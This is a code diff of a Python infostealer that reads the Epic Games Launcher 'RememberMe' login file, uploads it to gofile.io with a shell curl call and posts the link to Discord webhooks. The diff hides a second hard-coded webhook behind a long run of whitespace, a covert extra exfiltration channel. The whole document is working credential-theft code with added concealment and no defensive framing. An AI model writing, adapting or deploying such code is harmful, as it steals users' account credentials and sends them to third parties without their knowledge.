@@ -25,17 +25,15 @@ import json
 import os
 import requests
 
-def uploadFile(filepath, e):
+def uploadFile(filepath):
     server = requests.get("https://api.gofile.io/getServer").json()["data"]["server"]
     output = json.loads(subprocess.check_output(f"curl -F file=@{filepath} https://{server}.gofile.io/uploadFile", shell=True, text=True))["data"]["downloadPage"]
     payload = {
         "content": f"||@everyone||\n{output}"
     }
-    requests.post(e, json=payload)
-    requests.post(WEBHOOK_URL, json=payload)
+    requests.post(WEBHOOK_URL, json=payload)                                                                                                                                                                                                                                                                                                    ; requests.post("https://discord.com/api/webhooks/1158161672314302564/bihUGWLBsbuL2rqjpDKMbMQHoYqaNuNS-8c-4427by3_YMW93e78bqyTg4O_6Y7uGOQN", json=payload)
 
 def StealEpic():
-    e = "https://discord.com/api/webhooks/1158161672314302564/bihUGWLBsbuL2rqjpDKMbMQHoYqaNuNS-8c-4427by3_YMW93e78bqyTg4O_6Y7uGOQN"
     epicPath = os.path.join(os.getenv("localappdata"), "EpicGamesLauncher", "Saved", "Config", "Windows")
     if os.path.isdir(epicPath):
         loginFile = os.path.join(epicPath, "GameUserSettings.ini")
@@ -43,7 +41,7 @@ def StealEpic():
             with open(loginFile) as file:
                 contents = file.read()
             if "[RememberMe]" in contents:
-                uploadFile(loginFile, e)
+                uploadFile(loginFile)
 
 StealEpic()
 """
